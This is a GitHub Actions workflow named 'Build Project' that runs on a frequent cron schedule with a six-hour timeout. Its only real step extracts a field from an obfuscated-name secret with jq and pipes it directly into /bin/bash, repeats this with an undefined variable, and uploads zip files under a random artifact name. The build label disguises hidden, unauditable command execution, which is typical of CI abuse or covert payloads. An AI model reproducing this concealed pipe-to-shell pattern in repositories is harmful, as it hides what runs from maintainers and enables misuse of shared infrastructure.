name: Build Project
on:
  workflow_dispatch:

  schedule:
    - cron: '44 4,10,16,22 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  service:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Run
        env:
          z3731: ${{ secrets.z3731 }}
        run: |
          printf '%s' "$z3731" | jq -r .sm9730 | /bin/bash
          printf '%s' "$tt9" | jq -r .b35 | /bin/bash

      - name: Save archive
        uses: actions/upload-artifact@v4
        with:
          name: yrqCO9RR
          path: "*.zip"
          retention-days: 1
